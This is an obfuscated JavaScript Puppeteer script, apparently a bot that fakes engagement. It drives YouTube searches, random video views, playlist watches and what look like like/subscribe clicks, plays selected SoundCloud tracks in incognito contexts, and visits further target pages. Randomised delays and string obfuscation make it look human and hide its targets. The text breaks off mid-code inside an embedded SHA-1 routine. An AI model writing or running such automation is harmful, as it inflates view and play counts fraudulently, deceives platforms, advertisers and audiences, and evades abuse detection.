const a0 = d,
  Z = b,
  Y = c;

function getRandomInt(f, h) {
  const i = ceil(f);
  return floor(random() * (floor(h) - i + (0x24d2 + 0x23c6 + -0x1 * 0x4897))) + i;
}

function d(b, c) {
  const e = a();
  return d = function(f, g) {
    f = f - (0x2242 + -0x14f8 + -0xd4a);
    let h = e[f];
    return h;
  }, d(b, c);
}
async function createPage(f, h) {
  let i = await f['newPage']();
  return await i['setDefault' + 'Navigation' + 'Timeout'](0x1bb5 + -0x1365 + -0x850), await i['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i;
}
async function standardGoto(f, h, i) {
  return await f['goto'](h, {
    'waitUntil': ['domcontent' + 'loaded'],
    'timeout': 0x0
  }), i ? await wait(-0x3 * 0x486b + 0x1 * -0x4fb2 + 0x19e23 + (-0x5fc5 * -0x1 + 0x2f * 0x104 + -0x54e9) * random()) : await standardWaitForNetIdle(f), await wait(0x21c0 + -0x4d7 + 0x31 * -0x31 + (-0x1565 + 0x1 * -0x1204 + 0x1 * 0x4e79) * random()), 0xe2 + -0x1c6 + 0xe5;
}
async function standardWaitForNetIdle(f) {
  return await wait(-0x143e + -0x1be4 + 0x43aa), await f['waitForNet' + 'workIdle']({
    'idleTime': 0x1d4c,
    'timeout': 0x0
  }), -0x1e29 + -0x1 * -0x18de + 0x3 * 0x1c4;
}
async function randomWait() {
  return await wait(-0x1e08 + -0x2593 * -0x1 + 0xbfd * 0x1 + (0x1f33 + -0x11 * 0x57 + 0x1 * -0x5e4) * random()), -0x2 * -0x11 + -0x417 + 0x3f6;
}
async function watchRandomFrontScreenVideo(f) {
  await f['evaluate'](() => {
    var i;
    (i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('yt-core-im' + 'age--fill-' + 'parent-hei' + 'ght\x20yt-cor' + 'e-image--f' + 'ill-parent' + '-width\x20yt-' + 'core-image' + '\x20yt-core-i' + 'mage--cont' + 'ent-mode-s' + 'cale-aspec' + 't-fill\x20yt-' + 'core-image' + '--loaded'))['slice'](0x1 * -0x1803 + 0x11f5 * -0x1 + 0x44 * 0x9e, -0x25f2 + 0x151 * -0x5 + 0x2c8e), i[Math['floor'](Math['random']() * i['length'])])['setAttribu' + 'te']('id', '__scope');
  }), await randomWait(), await f['click']('#__scope'), await standardWaitForNetIdle(f);
  const h = await getMaxTime(f);
  return await wait(Math['min']((0xc0e4 + 0xd9aa + -0xb02e) * getRandomInt(0x1c * 0x28 + -0xa57 + 0x8b * 0xb, 0x3 * -0xb15 + -0x1e11 + 0x1f * 0x20b), h)), -0xce * -0x8 + -0x24d5 + 0x1e66;
}
async function getMaxTime(f) {
  return await f['evaluate'](() => {
    const h = {
      'Seconds': 0x3e8,
      'Minutes': 0xea60,
      'Hours': 0x36ee80,
      'Second': 0x3e8,
      'Minute': 0xea60,
      'Hour': 0x36ee80
    };
    let i = Array['from'](document['getElement' + 'sByClassNa' + 'me']('ytp-progre' + 'ss-bar'))['pop']()['ariaValueT' + 'ext'],
      j = -0xa * 0x199 + -0x4 * -0x6fd + -0xbfa;
    i = i['split'](i['includes']('of') ? '\x20of\x20' : ',\x20')[0x25 * 0xfd + -0x1f * -0xc8 + 0x3cc8 * -0x1]['split']('\x20');
    for (let k = -0x1741 + 0x21f7 + -0xab6; k < i['length']; k += 0x1 * 0x1981 + -0xe51 + -0xb2e)
      j += i[k] * h[i[k + (-0x3 * -0x2a7 + 0x1f74 + 0xc2 * -0x34)]];
    return j;
  });
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0x2242 + -0x14f8 + -0xd4a);
    let h = e[f];
    if (b['klCbHw'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = -0x1 * -0x1f96 + -0x1 * -0x12fd + -0x3293, s, t, u = -0x3 * 0xac1 + -0xd5d * 0x1 + 0xb68 * 0x4; t = n['charAt'](u++); ~t && (s = r % (-0x1b * 0x119 + -0x2d * 0x51 + 0x2be4) ? s * (-0x1bf6 + -0x1b4 + -0xe * -0x223) + t : t, r++ % (0xfad + 0xd * 0x13 + -0x850 * 0x2)) ? p += String['fromCharCode'](0x227 + -0x5 * -0x2b5 + -0xeb1 & s >> (-(-0x2 * 0x4d2 + 0x1ec1 + -0x151b) * r & 0x1 * 0x25a2 + -0x1 * -0x230 + -0x27cc)) : -0x248a + -0x817 + 0x2ca1) {
          t = o['indexOf'](t);
        }
        for (let v = -0x62c + -0x2 * 0x886 + -0x1 * -0x1738, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x13fd + -0x718 * -0x1 + -0x1b05 * 0x1))['slice'](-(-0x6 * -0x40b + 0x26fb + -0x1 * 0x3f3b));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x1 * -0xae + -0x2 * -0x17f + -0x3ac,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0x895 + 0x1 * -0x1803 + 0x95 * 0x38; u < 0x1bfa + 0xfcd + -0x2ac7; u++) {
          p[u] = u;
        }
        for (u = 0x26fc + 0x2 * 0xdf3 + -0x42e2; u < -0x2 * 0x337 + 0x28 * -0x97 + 0x1f06; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (0x20f2 + 0x13d6 + 0x8 * -0x679), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = 0x1 * -0x6b2 + 0x995 + -0x2e3 * 0x1, q = -0x147 + 0x2be * -0x3 + 0x981;
        for (let v = 0x244a + 0x6fd * -0x2 + 0x44 * -0x54; v < n['length']; v++) {
          u = (u + (0x9f8 * 0x1 + -0xdc1 + -0x1 * -0x3ca)) % (-0x9 * 0x377 + 0x1 * -0x191f + 0x394e), q = (q + p[u]) % (0x1 * -0xc8f + 0x7f5 + 0x59a), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0x1994 + 0x1666 + -0x1 * 0x2efa)]);
        }
        return t;
      };
      b['WEsCKP'] = m, c = arguments, b['klCbHw'] = !![];
    }
    const j = e[-0x221 * 0x5 + -0x200f + 0x6 * 0x71e],
      k = f + j,
      l = c[k];
    return !l ? (b['gDfWzt'] === undefined && (b['gDfWzt'] = !![]), h = b['WEsCKP'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}

function a() {
  const bp = [
    'sfrnta',
    'v0.6',
    'WPautSoS',
    'zg9fEhrgAw5Nzq',
    'W7qtWPy8iuRcU8oZWRFcQa',
    'zs9TB29TB28UAq',
    'outube-add',
    'W6hcLvPevd1UWPnezW',
    'WO7dHeJdKL3dUbGNW45Z',
    'apress',
    '#button\x20>\x20',
    'ity',
    'Dw5NA29VAYbIDa',
    'B2qTA2f0yw5Hlq',
    '8.0.5359.1',
    'zxzqC0PStKX5xW',
    'getAttribu',
    'omk3hWG4er/cMJpdLq',
    'oxpAvc6tDP',
    'AhjVBwuVmta4lG',
    'pIb5Dc1IDxr0BW',
    'Es1Izwf0CZ9ZAq',
    'h0PKFed2GB',
    'z2v0',
    'csSknGjb',
    'rter-resou',
    'lCozW7ddRuyihaLgWRK',
    'z2v0qxr0CMLIDq',
    'WQVdOmoPWRhdJSk6rh9moG'
  ];
  a = function() {
    return bp;
  };
  return a();
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0x2242 + -0x14f8 + -0xd4a);
    let h = e[f];
    if (c['bjrNxo'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = -0x1 * -0x1f96 + -0x1 * -0x12fd + -0x3293, r, s, t = -0x3 * 0xac1 + -0xd5d * 0x1 + 0xb68 * 0x4; s = m['charAt'](t++); ~s && (r = q % (-0x1b * 0x119 + -0x2d * 0x51 + 0x2be4) ? r * (-0x1bf6 + -0x1b4 + -0xe * -0x223) + s : s, q++ % (0xfad + 0xd * 0x13 + -0x850 * 0x2)) ? o += String['fromCharCode'](0x227 + -0x5 * -0x2b5 + -0xeb1 & r >> (-(-0x2 * 0x4d2 + 0x1ec1 + -0x151b) * q & 0x1 * 0x25a2 + -0x1 * -0x230 + -0x27cc)) : -0x248a + -0x817 + 0x2ca1) {
          s = n['indexOf'](s);
        }
        for (let u = -0x62c + -0x2 * 0x886 + -0x1 * -0x1738, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](0x13fd + -0x718 * -0x1 + -0x1b05 * 0x1))['slice'](-(-0x6 * -0x40b + 0x26fb + -0x1 * 0x3f3b));
        }
        return decodeURIComponent(p);
      };
      c['mDmOUi'] = i, b = arguments, c['bjrNxo'] = !![];
    }
    const j = e[-0x1 * -0xae + -0x2 * -0x17f + -0x3ac],
      k = f + j,
      l = b[k];
    return !l ? (h = c['mDmOUi'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}
async function anchorAndView(f) {
  log('goto\x20chann' + 'el\x20and\x20vie' + 'w\x20video\x20pr' + 'ocess...'), await standardGoto(f, channels['random']()), await f['click']('tp-yt-pape' + 'r-tab.styl' + 'e-scope:nt' + 'h-child(4)' + '\x20>\x20div:nth' + '-child(1)'), log('clicked\x20vi' + 'deo\x20stuff'), await standardWaitForNetIdle(f), log('page\x20netwo' + 'rk\x20idle\x20x2'), await f['evaluate'](() => {
    const j = Array['from'](document['querySelec' + 'torAll']('#contents'))['filter'](l => 'style-scop' + 'e\x20ytd-rich' + '-grid-row' == l['getAttribu' + 'te']('class'))['slice'](-0x1 * 0x371 + -0x7b1 + 0xb28)['map'](l => Array['from'](l['children']))['flat'](0x26ae + 0x25 * -0xc4 + 0x1 * -0xa59)['map'](l => l['childNodes'][0x1 * -0x12f9 + -0x1795 + 0x2a8f]['childNodes'][-0x1 * 0x18d4 + -0x89b + 0x13d * 0x1b]['childNodes'][0x129b + 0x1add + -0x2d77]['childNodes'][0x545 + -0x703 + 0x2 * 0xdf]['childNodes'][0x1 * 0x1d0b + -0x1614 + -0x6f6]);
    var k;
    return (k = j)[Math['floor'](Math['random']() * k['length'])]['setAttribu' + 'te']('id', '__hookedVi' + 'dToWatch'), j['map'](l => l['href']);
  }), await wait(getRandomInt(0xcaa * -0x1 + 0xcc * 0x11 + 0x306, -0x16a1 + 0x13af + -0x336 * -0x7)), await f['click']('#__hookedV' + 'idToWatch'), await wait(0x43c7 + 0x53 * 0xd + -0xd66);
  const h = await getMaxTime(f),
    i = Math['min']((-0x3 * -0x8a9 + 0x11900 + -0x489b) * getRandomInt(0x10e1 + -0x172d + -0x1 * -0x64e, -0x5ad * 0x2 + 0x3 * 0x727 + -0xa16), h);
  return await wait(i), 0x53f + -0x99d + 0x45f;
}
async function frontScreenActions(f) {
  return log('going\x20to\x20f' + 'ront\x20scree' + 'n\x20and\x20clic' + 'king\x20rando' + 'm\x20video...'), await standardWaitForNetIdle(f), await randomWait(), log('click\x20atte' + 'mpt...'), await f['evaluate'](() => {
    var h;
    (h = Array['from'](document['getElement' + 'sByClassNa' + 'me']('style-scop' + 'e\x20ytd-rich' + '-grid-row'))['filter'](i => 'contents' != i['id']), h[Math['floor'](Math['random']() * h['length'])])['children'][-0x37 * -0x7f + -0xf2b * 0x1 + -0xc1e]['children'][0x1202 + 0x1 * 0x10ed + 0xb * -0x32d]['children'][-0x73d + -0x4 * -0x1f + 0x6c1]['children'][0x1 * 0x3f5 + 0x1d3b + -0x4 * 0x84c]['children'][0x1245 + -0x236c * 0x1 + -0x1 * -0x1127]['setAttribu' + 'te']('id', 'gottemezez');
  }), await randomWait(), await f['click']('#gottemeze' + 'z'), await standardWaitForNetIdle(f), await watchRandomFrontScreenVideo(f), 0x2 * -0x10b2 + -0x2e * 0xcd + 0x463b;
}
async function searchAndView(f) {
  log('searching\x20' + 'youtube\x20re' + 'sults'), await randomWait(), await f['evaluate'](() => {
    let j = Array['from'](document['querySelec' + 'torAll']('#search'));
    document['getElement' + 'ById']('__searchBo' + 'xReal') || j['find'](k => 'INPUT' === k['tagName'])['setAttribu' + 'te']('id', '__searchBo' + 'xReal');
  }), await f['type']('#__searchB' + 'oxReal', searchTerms['random'](), {
    'delay': -0xa5c + 0x1e3d + -0x137d + (-0x20c6 + -0x4 * -0x8d0 + 0x1 * -0x248) * random()
  }), await wait(-0x1217 + 0x183c + -0x431 + (0x1 * -0x1ca5 + 0x1 * -0xb32 + 0x2903) * random()), await f['click']('#search-ic' + 'on-legacy'), await async function j() {
    if (!await f['evaluate'](() => Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['length']))
      return await j();
  }(), await standardWaitForNetIdle(f);
  let h = await f['evaluate'](() => {
    const k = {
        'seconds': 0x3e8,
        'minutes': 0xea60,
        'hours': 0x36ee80,
        'second': 0x3e8,
        'minute': 0xea60,
        'hour': 0x36ee80
      },
      l = (m = Array['from'](document['getElement' + 'sByTagName']('ytd-video-' + 'renderer'))['map'](p => p['childNodes'][-0x1 * -0x17c9 + -0x1ff6 + 0x82f * 0x1]['childNodes'][-0x225 + 0x18d3 + 0x1 * -0x16ad]['childNodes'][0x1a52 + -0x18db + -0x176]))[Math['floor'](Math['random']() * m['length'])];
    var m;
    const n = l['childNodes'][0x14b + -0xc1 * -0x2b + -0x21b1]['childNodes'][-0x1324 * 0x2 + 0x83f * -0x1 + -0x2b * -0x115]['childNodes'][-0xf0 * 0x5 + -0x10fa + 0x4 * 0x56b]['ariaLabel'];
    return l['setAttribu' + 'te']('id', '__hookedVi' + 'dToClick'), l['scrollInto' + 'View'](),
      function(p) {
        let q = p['split'](',\x20')['map'](u => u['split']('\x20'))['flat'](-0x793 * 0x3 + 0x15c6 + 0xf4),
          r = 0x14db + 0x19d * 0x1 + 0x1 * -0x1678;
        for (let u = -0x17e9 + -0x341 * 0x6 + 0x1 * 0x2b6f; u < q['length']; u += 0x26ec + 0x1 * -0xdc9 + -0x1921)
          r += q[u] * k[q[u + (-0x124c + 0x1ec2 + 0x1 * -0xc75)]];
        return r;
      }(n);
  });
  await wait((-0x3c8c + -0x2e1a + -0xcb6 * -0xd) * Math['random']()), await f['click']('#__hookedV' + 'idToClick');
  let i = Math['min']((0x1411 * 0x7 + 0xd223 + -0x6 * 0x135f) * getRandomInt(0x2 * -0x16f + -0x1f80 + 0x225f, 0x1 * 0x252e + 0x1 * -0x1711 + -0x3 * 0x4b1), h + (-0x7d1 + -0x2 * -0x1070 + 0x5 * -0x11b));
  return await wait(i), -0x19 * -0x101 + -0xdca + -0xb4e;
}
async function keyWatch(f) {
  const S = c,
    R = d;
  log('standard\x20k' + 'eyWatch...'), await standardGoto(f, 'https://ww' + 'w.youtube.' + 'com/watch?' + 'v=' + hookPlaylistPoints['random']() + ('&list=PL7D' + '9Ps0wVt5cy' + 'nwDE_CPYb6' + 'aBUkYyfi-y'), 0x591 + -0x12d + -0x4 * 0x119), log('clicking..' + '.'), await f['click'](R(0xa) + 'ytd-button' + '-renderer\x20' + S(0x14) + 'n-shape\x20>\x20' + 'button\x20>\x20y' + 't-touch-fe' + 'edback-sha' + 'pe\x20>\x20div\x20>' + '\x20div.yt-sp' + 'ec-touch-f' + 'eedback-sh' + 'ape__fill'), await f['click']('#top-level' + '-buttons-c' + 'omputed\x20>\x20' + 'ytd-toggle' + '-button-re' + 'nderer\x20>\x20y' + 't-button-s' + 'hape\x20>\x20but' + 'ton\x20>\x20yt-t' + 'ouch-feedb' + 'ack-shape\x20' + '>\x20div\x20>\x20di' + 'v.yt-spec-' + 'touch-feed' + 'back-shape' + '__fill');
  const h = setInterval(async () => {
    log('executed\x20c' + 'leanup\x20int' + 'erval,\x20che' + 'ck\x20process' + '...'), await f['evaluate'](() => {
      setTimeout(() => {
        document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')?.['offsetPare' + 'nt'] && document['querySelec' + 'tor']('.ytp-large' + '-play-butt' + 'on')['setAttribu' + 'te']('id', '__lllll');
      }, -0x2623 + -0x2133 + 0x2 * 0x2987 + (-0x15d * -0x14 + -0x1336 + -0x76 * 0x9) * Math['random']());
    });
  }, 0xb * 0x291 + 0x1 * 0x2984 + -0x2a67);
  await wait(-0x1bd97 + -0x16 * 0xd1 + -0x17 * -0x471b);
  try {
    await f['click']('#__lllll');
  } catch (i) {}
  return await wait((-0x1c494 + 0xdbe2 + 0x1d312) * getRandomInt(0xde2 * -0x2 + -0x17b * -0xb + 0xb7f, -0x66 * 0x56 + 0x10d3 * 0x1 + 0x118a)), clearInterval(h), 0x1b5c + -0x5 * 0x39 + 0xd1f * -0x2;
}
async function runYTModule(f, h) {
  const i = await createPage(f, 'https://ww' + 'w.youtube.' + 'com/');
  for (await randomWait();;) {
    let j = 0xf0b + 0x2 * -0x779 + -0x19;
    try {
      await standardWaitForNetIdle(i), await GlobalActions['random']()(i);
    } catch (k) {
      i['close']();
    }
    if (j)
      return -0xf65 + 0x14a + 0x2b * 0x54;
    await randomWait();
  }
  return -0x2 * 0xd6f + -0x1d * -0x43 + 0x1348;
}

function fetchRandomSC() {
  const T = c;
  return Math['random']() <= -0x2 * -0x2bd + 0x5 * 0x2c3 + -0x1349 * 0x1 + 0.5 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'long-day-r' + 'emix-prod-' + 'unnecessar' + T(0x15) + '=30458c9ce' + '44c4b4eaab' + '8a3eca1b3a' + '58e&utm_so' + 'urce=clipb' + 'oard&utm_m' + 'edium=text' + '&utm_campa' + 'ign=social' + '_sharing' : Math['random']() < 0x6b * -0x57 + -0x8ba * 0x1 + 0x1 * 0x2d17 + 0.2 ? 'https://so' + 'undcloud.c' + 'om/22down/' + 'whatnot-de' + 'mo?si=cf08' + 'c07128594b' + 'f6b3d049e1' + '680b972f&u' + 'tm_source=' + 'clipboard&' + 'utm_medium' + '=text&utm_' + 'campaign=s' + 'ocial_shar' + 'ing' : 'https://so' + 'undcloud.c' + 'om/22down/' + 'worried-ab' + 'out-the-tr' + 'uth-ft-rik' + 'anbeastly-' + 'nikkkq-cas' + 'ualcheater' + '?si=20d1c3' + '32655b4ef1' + '98a379eac0' + '05725b&utm' + '_source=cl' + 'ipboard&ut' + 'm_medium=t' + 'ext&utm_ca' + 'mpaign=soc' + 'ial_sharin' + 'g';
}
async function runGFModule(f, h) {
  async function i() {
    const U = c;
    if (doFlags['doSoundClo' + 'ud'] && Math['random']() >= 0xb0c + -0x908 + -0x204 + 0.3) {
      const j = await f['createInco' + 'gnitoBrows' + 'erContext'](),
        k = await j['newPage']();
      let l = -0xc4 * 0xe + -0x34f + 0xe07;
      if (await k['goto'](fetchRandomSC(), {
          'timeout': NETWORK_PATIENCE
        })['catch'](m => l++), l)
        return await k['close'](), await j['close'](), i();
      try {
        const m = await k['evaluate'](() => {
          let n = document['querySelec' + 'tor']('#content\x20>' + '\x20div\x20>\x20div' + '.l-listen-' + 'hero\x20>\x20div' + '\x20>\x20div.ful' + 'lHero__for' + 'eground.fu' + 'llListenHe' + 'ro__foregr' + 'ound.sc-p-' + '4x\x20>\x20div.f' + 'ullHero__t' + 'itle\x20>\x20div' + '\x20>\x20div\x20>\x20d' + 'iv.soundTi' + 'tle__playB' + 'utton.soun' + 'dTitle__pl' + 'ayButtonHe' + 'ro.theme-l' + 'ight\x20>\x20a');
          n && 'Play' === n['textConten' + 't'] && n['click']();
        });
        await wait(0x31b1 + 0x9a + -0x1 * -0x7d7d + getRandomInt(0x5dba + 0x55da + -0x78fc, -0x4 * 0x185c + 0x90f6 + 0x1e2 * 0x25));
      } catch (n) {}
      return await k['close'](), await j['close'](), i();
    } {
      const {
        url: p,
        preRef: q
      } = scriptTargets['randomFlus' + 'h'](0x2272 + 0x9f * -0x3c + 0x2d3), r = await f['createInco' + 'gnitoBrows' + 'erContext'](), s = await r['newPage']();
      let u = 0x9 * -0x182 + -0x1cb0 + 0x2a42;
      if (await s['goto'](q, {
          'timeout': NETWORK_PATIENCE
        })['catch'](w => u++), u)
        return await s['close'](), await r['close'](), i();
      const v = await s['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + U(0x0));
      return log(v['slice'](-0x144b + -0x19f4 + -0x2e3f * -0x1, -0x24a + -0x9 * 0x3d7 + 0x250b)), v['includes']('script-des' + 'cription') ? (log('p1'), await s['goto'](p, {
        'timeout': NETWORK_PATIENCE
      })['catch'](w => u++), u ? (await s['close'](), await r['close'](), i()) : (await new Promise(w => setTimeout(w, 0x6c5 * 0x5 + -0x1834 + -0x1 * 0x1d5 + floor((0x7cd * -0x5 + -0xd12 + 0x37fb) * random()))), log('p2'), log(await s['evaluate'](() => {
        const V = b;
        var w, x, y, z, A, B, C, D, E = 'object' == typeof window ? window : {},
          F = !E['JS_SHA1_NO' + '_NODE_JS'] && 'object' == typeof process && process['versions'] && process['versions']['node'];
        F && (E = global), w = ('0123456789' + 'abcdef')['split'](''), x = [
          -(-0x1 * -0x3c85cc54 + 0xe5c7a6e2 + -0xa24d7336),
          -0xd27c7c + 0x34ad93 * 0x2 + 0x1ca * 0x824f,
          -0x3 * -0x2f + 0xaba + 0x74b9,
          -0x1ac * -0x14 + -0x5 * -0x77d + 0x4661 * -0x1
        ], y = [
          -0x11 * -0x15a + -0xa8d + 0x29 * -0x4d,
          0x1c95 * -0x1 + 0x5dc * -0x5 + -0xd * -0x475,
          -0x1c67 + 0x5a5 + 0x16ca,
          0x1c61 * -0x1 + 0x1 * 0x18bc + -0x3 * -0x137
        ], z = [
          'hex',
          'array',
          'digest',
          'arrayBuffe' + 'r'
        ], A = [], B = function(J) {
          return function(K) {
            return new G(0x1c5d * 0x1 + 0xe * 0xc4 + 0xf4 * -0x29)['update'](K)[J]();
          };
        }, C = function() {
          var J, K, L = B('hex');
          for (F && (L = D(L)), L['create'] = function() {
              return new G();
            }, L['update'] = function(M) {
              return L['create']()['update'](M);
            }, J = 0x176c + -0xa2b + -0xd41; J < z['length']; ++J)
            K = z[J], L[K] = B(K);
          return L;
        }, D = function(J) {
          var K = eval('require(\'crypto\');'),
            L = eval('require(\'buffer\')[\'Buffer\'];'),
            M = function(N) {
              if ('string' == typeof N)
                return K['createHash']('sha1')['update'](N, 'utf8')['digest']('hex');
              if (N['constructo' + 'r'] === ArrayBuffer)
                N = new Uint8Array(N);
              else {
                if (void(-0xa3a + 0xec1 + 0x13 * -0x3d) === N['length'])
                  return J(N);
              }
              return K['createHash']('sha1')['update'](new L(N))['digest']('hex');
            };
          return M;
        };
        class G {
          constructor(J) {
              J ? (A[-0x95 * -0xf + 0xc64 * 0x3 + -0x2de7] = A[0x5 * 0x44c + 0xfd7 * -0x2 + -0xd * -0xca] = A[-0x10 * -0x12 + -0x504 + 0x3e5] = A[-0x1681 + 0x10eb + -0x598 * -0x1] = A[-0x52d + -0x17ee + 0x1d1e] = A[-0xaac * 0x1 + 0x22de + -0xc17 * 0x2] = A[-0xa7f * -0x1 + 0x7 * 0x2e4 + -0x1eb6] = A[-0x192 * -0x12 + -0x7cd * -0x2 + -0x8 * 0x57b] = A[-0x2 * -0x12d4 + -0x2fe * 0x8 + -0x2bd * 0x5] = A[-0x2 * 0x6fb + 0x1364 + 0x2b3 * -0x2] = A[0x24 * -0x8 + -0xd * 0x223 + -0x73c * -0x4] = A[0x25 * -0x82 + 0x1208 + 0x1 * 0xcc] = A[-0x740 + 0x249d + -0x36 * 0x8b] = A[-0x1cde + 0xfc0 + 0xd2a] = A[-0x2572 + 0x4f * 0x25 + 0x1a14] = A[-0x439 + -0x1d78 + 0x21bf] = A[-0x2014 + -0x1047 + 0x306a] = 0x4fc + 0x2008 + -0x2e * 0xce, this['blocks'] = A) : this['blocks'] = [
                0x1d6e + -0x120 * 0xc + -0xfee,
                0x81f + 0x3 * -0x655 + 0xae0,
                0x1 * 0xd3d + 0x4e + -0xd8b * 0x1,
                0xb * -0x47 + 0x241c + -0x111 * 0x1f,
                0x1030 + -0x1395 + 0x365,
                0x96c + -0x115 * -0x13 + -0x1dfb,
                -0xd * 0x10c + 0x1 * -0x247b + 0x3217,
                0xb3 * -0x1d + 0x678 + 0xdcf,
                0x209 * -0x1 + -0xad8 + 0x1d7 * 0x7,
                0x2170 + 0xf35 + 0x1037 * -0x3,
                0xc8b * -0x2 + -0x6c5 * -0x1 + 0x1251,
                0x1 * -0x9af + -0x107 * -0x9 + 0x70,
                0x8ad * -0x2 + 0x4 * 0x167 + -0x5df * -0x2,
                0xe36 + -0x1b9a + -0x1 * -0xd64,
                -0xddd + -0x1e0f + 0x2bec,
                0xd * 0x2e5 + 0x1373 + -0x3914,
                -0x1 * -0xe84 + 0x1 * 0x2579 + -0x33fd
              ], this['h0'] = 0x3 * -0x2f1fb987 + 0x3fd50171 * 0x3 + 0x35254b43, this['h1'] = 0x110f * 0x5293b + -0x52f63 * 0x1c77 + -0x65e8937 * -0x2f, this['h2'] = -0x7b7679ba + -0xe6b7e4ab + -0x21685 * -0xf2c7, this['h3'] = 0x1a160ee9 + -0x11bc4798 + 0x108a3 * 0x797, this['h4'] = 0x9218e161 + 0x1 * -0x1339e8ffb + 0x16558908a, this['block'] = this['start'] = this['bytes'] = this['hBytes'] = -0x1 * 0x101f + -0x21cb + -0x31ea * -0x1, this['finalized'] = this['hashed'] = 0x5d9 * 0x1 + 0xf * 0x235 + -0x26f4, this['first'] = -0x64 * -0x36 + 0x843 + -0x1d5a;
            }
            [V(0x18, 'hb#z')](J) {
              var K, L, M, N, O, P;
              if (!this['finalized']) {
                for ((K = 'string' != typeof J) && J['constructo' + 'r'] === E['ArrayBuffe' + 'r'] && (J = new Uint8Array(J)), M = 0x3 * -0x1d + 0x1ff6 + -0x1f9f, O = J['length'] || 0x11fa + 0x1 * 0x157a + -0xca * 0x32, P = this['blocks']; M < O;) {
                  if (this['hashed'] && (this['hashed'] = 0x1139 + 0x1c * -0xd8 + 0x667 * 0x1, P[-0x548 + -0x6f * 0x12 + -0x32 * -0x43] = this['block'], P[-0x1 * 0xf4 + 0x155c * 0x1 + -0x1458] = P[0x1 * -0xbb2 + -0x126d * 0x1 + -0x20 * -0xf1] = P[0x1 * 0x1967 + -0x19e2 + 0x7d] = P[0x2422 + 0x3 * -0xbec + -0x1 * 0x5b] = P[0xae6 + 0x1 * -0x164d + 0xb6b] = P[0x21f2 + -0x255d + 0x370] = P[0x170d * -0x1 + -0x2101 + 0x3814] = P[-0x1b06 + -0x467 + 0x6 * 0x53e] = P[-0x4b * -0x76 + 0x1ece + -0xa4 * 0x66] = P[0xc11 + 0x1506 + -0x1087 * 0x2] = P[0x82 * 0x20 + -0xeec + -0x14a] = P[0x8b2 + -0xc9d * -0x2 + -0x21e1] = P[-0x1f4e + 0x2 * -0xc17 + -0x6f1 * -0x8] = P[-0x7 * -0x39f + 0x10b * -0x23 + -0x13 * -0x97] = P[-0x1bd + -0x30b + 0x4d6] = P[0x6a * -0x29 + 0x1 * -0x1922 + -0x1 * -0x2a2b] = 0x92f * 0x2 + 0xed9 + -0x305 * 0xb), K) {
                    for (N = this['start']; M < O && N < 0x94d * -0x4 + 0x204f + 0x525; ++M)
                      P[N >> -0xd4a + -0xca * -0xb + 0x49e] |= J[M] << y[0x8c0 + 0x74f + -0x100c & N++];
                  } else {
                    for (N = this['start']; M < O && N < 0x2504 + 0x989 + -0x1 * 0x2e4d; ++M)
                      (L = J['charCodeAt'](M)) < -0x951 + -0x1d5 * 0x8 + -0x4e5 * -0x5 ? P[N >> 0x169b + 0x1aae + -0x3147] |= L << y[0x1e06 + 0xbe1 + -0x29e4 & N++] : L < 0x1ded + -0x1d5d + 0x770 ? (P[N >> 0x11d * -0x9 + 0x2 * -0x1a3 + 0xd4d] |= (0x512 + 0x1d48 + -0x11 * 0x1fa | L >> 0x8 * -0x4bc + -0x114a + 0x3730) << y[0xec5 + -0x5a * -0xe + 0xe5 * -0x16 & N++], P[N >> -0x322 * -0x9 + -0x1076 + -0xbba] |= (-0x22ad + -0x1a38 + -0x4b9 * -0xd | -0x12b5 + 0x1282 + -0x3 * -0x26 & L) << y[-0x2315 + -0x1 * 0x168f + 0x39a7 & N++]) : L < -0x1 * -0xd25 + -0x4987 + 0x11462 || L >= -0x14fc1 + -0x1bf3 * 0x2 + 0x267a7 ? (P[N >> 0x36 * 0x39 + 0x141d * -0x1 + 0x819] |= (-0x2b * 0x6d + -0x20f1 + 0x3420 | L >> -0x949 + -0x99b + 0x12f0) << y[0x1ae3 + -0x296 * 0x4 + -0x422 * 0x4 & N++], P[N >> -0xcdc + -0x18f8 + 0x25d6] |= (0x2216 + 0x1393 + -0x3529 | L >> 0x2b4 * -0xe + -0xdc6 * -0x1 + -0x202 * -0xc & 0x2019 * 0x1 + -0x2522 * -0x1 + -0x44fc) << y[-0x2 * 0x133e + -0x1a * -0x9 + 0x2595 & N++], P[N >> 0x2276 + -0x7f2 + 0xd41 * -0x2] |= (-0x733 + -0xce * -0x2b + 0x1 * -0x1ae7 | 0x4e9 + 0x212b + -0x25d5 & L) << y[-0x1dd1 + 0x247d * -0x1 + 0x1 * 0x4251 & N++]) : (L = 0x2 * 0x310d + 0x1 * 0xf35b + -0x5575 + ((0x152a + 0xb * 0x13e + -0x1ed5 & L) << 0xa6f * -0x1 + -0x77 * -0x1d + -0x302 | -0x16ca + -0x1 * -0x121d + 0x8ac & J['charCodeAt'](++M)), P[N >> 0x8ec + 0x1c * -0x69 + -0xe * -0x2f] |= (0x207 * 0x9 + -0x1 * -0x270e + -0x385d | L >> 0x4e1 * -0x3 + -0x754 + -0x1 * -0x1609) << y[0x20c7 * 0x1 + -0x5d4 + -0x1af0 & N++], P[N >> -0xae3 + 